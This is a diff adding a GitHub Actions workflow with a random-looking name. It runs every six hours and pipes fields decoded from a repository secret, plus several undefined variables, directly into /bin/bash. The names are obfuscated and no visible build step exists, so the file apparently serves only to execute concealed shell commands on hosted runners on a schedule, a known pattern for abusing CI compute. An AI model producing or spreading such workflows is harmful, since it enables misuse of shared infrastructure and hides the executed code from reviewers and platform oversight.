@@ -1,0 +1,22 @@
+name: luoshengjiao3419
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luoshengjiao3419
+        env:
+          a894: ${{ secrets.a894 }}
+        run: |
+          echo $a894 | jq -r .wl661 | /bin/bash
+          echo $czk83042 | jq -r .dhquo6783 | /bin/bash
+          echo $uip53 | jq -r .fvbkm85 | /bin/bash
+          echo $wcyp6 | jq -r .vd4407 | /bin/bash
+          echo $tajuu3334 | jq -r .ojncr65 | /bin/bash
+
